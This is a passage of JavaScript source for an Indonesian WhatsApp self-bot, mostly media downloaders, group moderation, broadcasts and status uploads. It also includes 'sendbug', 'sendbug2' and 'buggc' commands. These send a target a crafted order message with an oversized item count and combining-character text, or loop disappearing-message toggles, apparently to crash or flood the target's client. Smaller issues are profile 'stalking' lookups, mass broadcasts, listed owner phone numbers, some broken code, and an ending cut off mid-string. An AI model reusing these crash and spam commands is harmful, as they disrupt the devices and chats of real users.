					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('𝗧𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 ??𝗮𝗻𝗴 𝗶𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `╭────────────────⊱
║> *_ASEK DAPAT JATAH OPEN BO.KICK_*
╰────────────────⊱
 🤭 :\n`
							teks += `@_.split("@")[0]`
						}
						mentions(teks, mentioned, true)
						hexa.groupRemove(from, mentioned)
					} else {
						mentions(`╭────────────────⊱
║> *_ASEK DAPAT JATAH OPEN BO.KICK_*
╰────────────────⊱
 @${mentioned[0].split("@")[0]} 🤭`, mentioned, true)
						hexa.groupRemove(from, mentioned)
					}
					break
case 'add':
  if (!mek.key.fromMe) return reply('SELF-BOT')
					if (args.length < 1) return reply('Yang mau di add siapa??')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						hexa.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
case 'igvideo':
			case 'ig':
			


			if (args.length == 0) return reply(`Contoh : ${prefix + command} https://www.instagram.com/p/CQpUpGvAhWq/?utm_source=ig_web_copy_link`) 
			linkkkkk = body.slice(9) 
			try {
			const yes = await hx.igdl(q) 
			console.log(yes)
			haloo = `${yes[0].downloadUrl}`
			gayyyyy = await getBuffer(haloo) 
			sendMediaURL(from, gayyyyy, video, {mimetype: 'video/mp4', filename: `PythonBot.mp4`, quoted: ftroli, caption: 'Support *𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺* Dengan Follow :\nInstagram.com/finoooooo_'}) 
			} catch (error) {
			console.log(error)
			}
			break
			case 'igaudio':
			


			if (args.length == 0) return reply(`Contoh : ${prefix + command} https://www.instagram.com/p/CQpUpGvAhWq/?utm_source=ig_web_copy_link`) 
			try {
			const yes = await hx.igdl(q) 
			console.log(yes)
			himya = `${yes[0].downloadUrl}`
			knom = await getBuffer(himya) 
			hexa.sendMessage(from, knom, audio, {mimetype: 'audio/mp4', filename: `HansBot.mp3`, quoted: ftroli}) 
			} catch (error) {
			console.log(error)
			}
			await limitAdd(sender) 
			break
			case 'igimage':
			


			if (args.length == 0) return reply(`Contoh : ${prefix + command} https://www.instagram.com/p/CQXahxwlK_A/?utm_medium=copy_link`)
			try {
			const yes = await hx.igdl(q) 
			console.log(yes)
			haloo = `${yes[0].downloadUrl}`
			oper = await getBuffer(haloo) 
			captiony = `Support *𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺* Dengan Follow :\nInstagram.com/finoooooo_`
			hexa.sendMessage(from, oper, image, {quoted: ftroli, caption: captiony}) 
			} catch (error) {
			console.log(error)
			}
			await limitAdd(sender)
			break
			case 'igstory':
			


			if (args.length == 0) return reply(`Contoh : ${prefix + command} jokowi`) 
			jokooooooo = body.slice(9) 
			try {
			const yes = await hx.igstory(`${jokooooooo}`) 
			jokowi = `${yes[0].downloadUrl}`
			reply(jokowi) 
			buper = await getBuffer(jokowi) 
			ini_yyyy = `Support *𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺* Dengan Follow :\nInstagram.com/finoooooo_`
			hexa.sendMessage(from, buper, video, {mimetype: 'video/mp4', filename: `PythonBot.mp4`, quoted: ftroli, caption: ini_yyyy}) 
			console.log(yes)
			} catch (error) {
			console.log(error)
			}
			await limitAdd(sender)
			break
			case 'tiktokvideo':
			case 'ttvideo':
	  case 'tiktok2':
			if (args.length == 0) return reply(`Contoh : ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`) 
			try {
			const yes = await hx.ttdownloader(q) 
			console.log(yes)
			Ini_video = await getBuffer(yes.nowm) 
			yyyy = `Nih kak @${sender.split("@")[0]}\n\n Jan lupa fllow ig, instagram.com/finoooooo_`
			hexa.sendMessage(from, Ini_video, video, {mimetype: 'video/mp4', filename: `PythonBot.mp4`, quoted: ftroli, caption: yyyy}) 
			} catch (error) {
			console.log(error)
			}
			break
case 'd':
case 'del':
case 'delete':
  if (!mek.key.fromMe) return reply('SELF-BOT')
hexa.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
		break

//-- owner Bot
case 'oh92':
 
    nomor = '50587753432@s.whatsapp.net','6288210864298@s.whatsapp.net'
    owner = await fs.readFileSync('./lib/image/fino.jpeg').toString('base64')
    capt = `Owner ${namabot}\nIG : finoooooo_\nFuck all`
    const been = {
    text: `@${nomor.split("@")[0]} Nih Owner ku, chat aja kalo ada perlu`,
  contextInfo: {
mentionedJid: [nomor]
  }
}
reply(been, text, capt, owner)
break
case 'tagall':
 hexa.updatePresence(from, Presence.recording)
		members_id = []
		teks = (args.length > 1) ? body.slice(8).trim() : ''
		teks += `  Total : ${groupMembers.length}\n`
		for (let mem of groupMembers) {
		teks += `*•* @${mem.jid.split("@")[0]}\n`
		members_id.push(mem.jid)
		}
		mentions('╔══✪〘 Mention All 〙✪══\n╠➥'+teks+'╚═〘 - - - - 〙', members_id, true)
		await limitAdd(sender)
		break
case 'tagall2':
		members_id = []
		teks = (args.length > 1) ? body.slice(8).trim() : ''
		teks += `  Total : ${groupMembers.length}\n`
		for (let mem of groupMembers) {
		teks += `╠➥ ${mem.jid.split("@")[0]}\n`
		members_id.push(mem.jid)
		}
		hexa.sendMessage(from, '╔══✪〘 Mention All 〙✪══\n╠➥'+teks+'╚═〘 - - - - 〙', text, {quoted:ftroli})
		await limitAdd(sender)
		break
		case 'tagall3':
		
		

		members_id = []
		teks = (args.length > 1) ? body.slice(8).trim() : ''
		teks += `  Total : ${groupMembers.length}\n`
		for (let mem of groupMembers) {
		teks += `╠➥ https://wa.me/${mem.jid.split("@")[0]}\n`
		members_id.push(mem.jid)
		}
		hexa.sendMessage(from, '╔══✪〘 Mention All 〙✪══\n╠➥'+teks+'╚═〘 - - - - - 〙', text, {detectLinks: false, quoted:ftroli})
		await limitAdd(sender)
		break
		case 'tagall4':
		
		

		members_id = []
		teks = (args.length > 1) ? body.slice(8).trim() : ''
		teks += `  Total : ${groupMembers.length}\n`
		for (let mem of groupMembers) {
		teks += `╠➥ ${mem.jid.split("@")[0]}@c.us\n`
		members_id.push(mem.jid)
		}
		hexa.sendMessage(from, '╔══✪〘 Mention All 〙✪══\n╠➥'+teks+'╚═〘 - - - - - 〙', text, {quoted:ftroli})
		await limitAdd(sender)
		break
		case 'tagall5':
		
		

		members_id = []
		teks = (args.length > 1) ? body.slice(8).trim() : ''
		teks += `  Total : ${groupMembers.length}\n`
		for (let mem of groupMembers) {
		teks += `╠➥ ${mem.jid.split("@")[0]}@s.whatsapp.net\n`
		members_id.push(mem.jid)
		}
		reply('╔══✪〘 Mention All 〙✪══\n╠➥'+teks+'╚═〘 - - - - - 〙')
		await limitAdd(sender)
		break
case 'githubstalk':
		
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/github/${body.slice(13)}?apikey=${lolkey}`, {method: 'get'})
					get_result = get_result.result
					txt = `Full : ${get_result.name}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.following}\n`
					txt += `Publick : ${get_result.public_repos}\n`
					txt += `Public Gits : ${get_result.public_gists}\n`
					txt += `User : ${get_result.user}\n`
					txt += `Compi : ${get_result.company}\n`
					txt += `Lokasi : ${get_result.location}\n`
					txt += `Email : ${get_result.email}\n`
					txt += `Bio : ${get_result.bio}\n`
					buffer = await getBuffer(get_result.avatar)
					hexa.sendMessage(from, buffer, image, {quoted: ftroli, caption: txt})
					break
		case 'tiktokstalk':

			username = args[0]
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${username}?apikey=${lolkey}`, {method: 'get'})
					get_result = get_result.result
					txt = `Link : ${get_result.username}\n`
					txt += `Bio : ${get_result.bio}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.followings}\n`
					txt += `Likes : ${get_result.likes}\n`
					txt += `Vidio : ${get_result.video}\n`
					buffer = await getBuffer(get_result.user_picture)
					hexa.sendMessage(from, buffer, image, {quoted: ftroli, caption: txt})
					break
            case 'admin':
            case 'creator':
            case 'developer':
                  hexa.sendMessage(from, {displayname: "peler", vcard: vcard, vcard2 }, MessageType.contact, { quoted: ftroli})
                  hexa.sendMessage(from, 'Tuh nomer owner ku >_<, jangan spam atau ku block kamu',MessageType.text, { quoted: ftroli} )
                  break
case 'stat':
 
 if (!mek.key.fromMe) return reply('SELF-BOT')
 anu = process.uptime()
 menu =`      ❐ *𝙿𝚈𝚃𝙷𝙾𝙽 𝚂𝚃𝙰𝚃* ❐
┏━━━━━━━ ❒
┣➣Prefix : *[ 𝙼𝚄𝙻𝚃𝙸-𝙿𝚁𝙴𝙵𝙸𝚇 ]*
┣➣WAConection : *[ 𝙱𝙰𝙸𝙻𝙴𝚈𝚂 ]*
┣➣Baileys Version : *[ 3.4.1 ]*
┣➣Run with : *[𝚃𝙴𝚁𝙼𝚄𝚇]*
┣➣Termux version : *[ 0.1.0.1 ]*
┣➣Browser : *[ 𝙵𝙸𝚁𝙴𝙵𝙾𝚇 ]*
┣➣Baterai : *[ ${baterai.baterai}% ]*
┣➣Charge : *[ ${baterai.cas === 'true' ? 'Ya' : 'Tidak'} ]*
┣➣Status : *[ ${banChats} ]*
┣➣Device : *[ ${device_manufacturer} ]*
┣➣Versi OS : *[ ${os_version} ]*
┣➣Versi Device : *[ ${device_model} ]*
┣➣RAM : *[ ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB ]*
┣➣MCC : *[ ${mcc} ]*
┣➣MNC : *[ ${mnc} ]*
┣➣Versi Wa : *[ ${hexa.user.phone.wa_version} ]*
┣➣Runtime :  ${kyun(anu)} 
┗━━━━━━━━ ❑`

hexa.sendMessage(from, menu, text, {quoted:fvideo}) 
break
case 'waktu':
case 'hari' :
 case 'Jam':
  case 'jamberapa':
hexa.updatePresence(from, Presence.recording)
 waktu = `┏━━━ ❒ *[ 𝚆𝙰𝙺𝚃𝚄 ]*
┣➣Hari : *[ ${tampilHari} ]*
┣➣Jam : *[ ${time} WIB ]*
┣➣Jam : *[ ${wit} WIT ]*
┣➣Jam : *[ ${wita} WITA ]*
┗━━━━━━━━ ❑`
hexa.updatePresence(from, Presence.recording)
hexa.sendMessage(from, waktu, text, {quoted:fvideo})
break

case 'upswteks':
 
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    hexa.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    hexa.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`crewbot`}, MessageType.location)
                    reply(`Sukses upload lokasi kek status:\n${teks}`)
                    break	
                 case 'upswsticker':
if (!mek.key.fromMe) return fakestatus('Owner Only!!!')
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hexa.downloadMediaMessage(encmedia)
						hexa.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker kek status whatsapp`)
                    break
                     case 'upswaudio':
                      
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hexa.downloadMediaMessage(encmedia)
						hexa.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio kek status whatsapp`)
						break
						case 'upswvoice':
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hexa.downloadMediaMessage(encmedia)
						hexa.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice kek status whatsapp`)
						break
case 'upswvideo':
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await hexa.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    hexa.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video kek status whatsapp:\n${konti}`)
                        break
                           case 'upswgif':
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')

                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await hexa.downloadAndSaveMediaMessage(enmedia)
                    
                    hexa.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif kek status whatsapp:\n${konti}`)
                        break
                        case 'upswimage':
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await hexa.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    hexa.sendMessage('status@broadcast', buffer, MessageType.image, {quoted:ftroli, caption: `${teksyy}`})
                    reply(`Sukses upload image kek status whatsapp:\n${teksyy}`)
                       break
                       case 'tes':
const rows = [
 {title: 'Ganteng', description: "", rowId:"Tes"},
 {title: 'Ganteng bat', description: "", rowId:"Tes"},
 {title: 'G', description: "", rowId:"Tes"},
 {title: 'Bacot', description: "", rowId:"Tes"},
 {title: 'Kontol', description: "", rowId:"Tes"},
]

const sections = [{title: "Fino ganteng kan ya", rows: rows}]

const button = {
 buttonText: 'Pilih sati jgn rebutan',
 description: `Fino ganteng kan?`,
 sections: sections,
 listType: 1
}

const sendMsg = await hexa.sendMessage(from, button, MessageType.listMessage)
break 

             
 
case 'sendbug':

if (!q) return reply(`Penggunaan:\n${prefix}sendbug 0@c.us (Untuk Kontak)\n${prefix}sendbug 0@g.us (Untuk Grup)`)
reply(`Sedang Diproses....`)
hexa.sendMessage(q, '𝕷𝖀⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢𝕱𝕴 4000 4001', text, {quoted : { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from} : {}) }, message: { orderMessage:{ orderId: '155157279766079', itemCount: '999999999999999999999', status: 'INQUIRY', surface:  'CATALOG', message: '*Cuman Trolli*', jpegthumnail: fs.readFileSync('./lib/image/fino.jpeg'), orderTitle: 'Cuih', sellerJid: '0@s.whatsapp.net', token: 'AR5wc3iY2NY8yJaK9MMXdlK/aguUxoA8yPtSFcvt0lrE5g==' }}}})
reply(`Sukses Mengirim Bug`)
break
case 'buggc':
await hexa.toggleDisappearingMessages(from)
reply("⤳𝙓ͯ𝙘ͨ𝙤ͦ𝙙ͩ𝙚ͤ 𝙬ⷠ𝙖ⷠ𝙨ⷠ 𝙝𝙚𝙧𝙚")
break
case 'sendbug2':
if (!q) return reply(`Penggunaan:\n${prefix}sendbug 0@c.us (Untuk Kontak)\n${prefix}sendbug 0@g.us (Untuk Grup)`)
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
await hexa.toggleDisappearingMessages(from, q)
}
reply('Sukses Send Bug Sebanyak '+args.join(' '))
					break
			case 'creategrup': 
			 case 'creategroup': 
			  case 'createg':
			   case 'create':
				argz = args.join('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					hexa.groupCreate(argz[0], mentioned)
					.then((res) => mek.FtroliForwarded(from, JSON.stringify(res, null, 2).toString(), fake))
					.catch((err) => console.log(err))
				} else {
					mek.reply(from, `Penggunaan ${prefix}creategrup namagrup|@tag`, mek)
				}
				break

					case 'myweb':
					 case 'infocreator':
					  
					 web = `Kunjungin web gua ya(Jangan di bully)\n https://FinoxAnggara.finxtxt.repl.co \n http://Finox999.github.io \n Web bucin: https://Buka-ya-hehehe.finxtxt.repl.co \nMy Github: github.com/Finox999 (follow bang)\nTelegram Bot: t.me/Finx999\nWhatsapp Bot: wa.me/6288210864298`
					 hexa.sendMessage(from, web, text, {quoted:ftroli})
					 break
case 'twitter':
			case 'twitvideo':
		
			if (args.length == 0) return reply(`Contoh : ${prefix + command} https://twitter.com/PassengersMovie/status/821025484150423557`) 
			Kontol_pino = body.slice(9) 
			try {
			const yes = await hx.twitter(`${Kontol_pino}`) 
			console.log(yes)
			okeh_vid = await getBuffer(yes.SD)
			ini_text = `*• Description :* ${yes.desc} \n\nSupport `
			hexa.sendMessage(from, okeh_vid, video, {mimetype: 'video/mp4', filename: `HansBot.mp4`, quoted: mek, caption: ini_text}) 
			} catch (error) {
			console.log(error)
			}
			await limitAdd(sender)
			break
				case 'clearall':
hexa
					anu = await hexa.chats.all()
					hexa.setMaxListeners(25)
					for (let _ of anu) {
						hexa.deleteChat(_.jid)
					}
					reply('Sukses delete all chat :)')
					break
				case 'bc':
hexa
					if (args.length < 1) return reply('.......')
					anu = await hexa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await hexa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							hexa.sendMessage(_.jid, buff, image, {caption: `*${body.slice(4)}*`})
						}
						reply('Suksess broadcast')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*${body.slice(4)}*`)
						}
						reply('Suksess broadcast')
					}
					break
case 'bc2':

					if (args.length < 1) return reply('.......')
					anu = await hexa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await hexa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							hexa.sendMessage(_.jid, buff, image, {caption: `「 Broadcast 𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺 」*\n\n${body.slice(4)}`})
						}
						reply('*Suksess broadcast* ')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `「 Broadcast hexa Bot 」\n\n${body.slice(4)}`)
						}
						reply('*Suksess broadcast* ')
					}
					break


  break
    case 'jadibot':
    if(mek.key.fromMe) return reply('Tidak bisa jadibot di dalam bot')
    jadibot(reply,hexa,from)
    break
    case 'stopjadibot':
    if(mek.key.fromMe)return reply('tidak bisa stopjadibot kecuali owner')
    stopjadibot(reply)
    break
    case 'listbot':
    let tekss = '「 *LIST JADIBOT* 」\n'
    for(let i of listjadibot) {
    tekss += `*Nomor* : ${i.jid.split("@")[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
    }
    reply(tekss)
    break
case 'linkwa':
 case 'carigrup':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
    case 'igstory2': 
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    hexa.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    hexa.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
    case 'caripesan':
            if(!q)return reply('pesannya apa bang?')
            let v = await hexa.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await hexa.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
    case 'lirik2':
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
    case 'otaku':
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            hexa.sendMessage(from,ram,image,{quoted:ftroli,caption:rem})
            break
    case 'komiku':
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break
    case 'chara':
            if(!q) return reply(`gambar apa?\n${prefix}chara hexa`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await hexa.sendMessage(from,li,image,{quoted: mek})
            break
    case 'pinterest3':
            if(!q) return reply('gambar apa?')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await hexa.sendMessage(from,di,image,{quoted: mek})
            break
    case 'playstore2':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
					case 'grup':
					if (args[0] === 'buka','open') {
					    reply(`\`\`\`✓Sukses Membuka Group\`\`\` *${groupMetadata.subject}*`)
						hexa.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'tutup','close') {
						reply(`\`\`\`✓Sukses Menutup Group\`\`\` *${groupMetadata.subject}*`)
						hexa.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					break
//--grup semua peserta
case 'closegc':
  hexa.updatePresence(from, Presence.recording)

  var nomor = mek.participant
  const close = {
text: `Grup ditutup oleh admin @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *hanya admin* yang dapat mengirim pesan`,
contextInfo: {
  mentionedJid: [nomor]
}
  }
  hexa.groupSettingChange (from, GroupSettingChange.messageSend, true);
  reply(close)
  break

//--grup hanya admin
case 'opengc':
  case 'bukagc':
hexa.updatePresence(from, Presence.recording)

open = {
  text: `Grup dibuka oleh admin @${sender.split("@")[0]}\nsekarang *semua peserta* dapat mengirim pesan`,
  contextInfo: {
mentionedJid: [sender]
  }
}
hexa.groupSettingChange (from, GroupSettingChange.messageSend, false)
hexa.sendMessage(from, open, text, {
  quoted: mek
})
break
case 'chatprank':
hexa.updatePresence(from, Presence.recording)


if (args.length < 1) return reply(`*☒* Masukan teks\nContoh : ${prefix}chatprank p/unten`)
tels = body.slice(11)
var teks1 = tels.split("/")[0];
var teks2 = tels.split("/")[1];
hasil = `${teks1}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏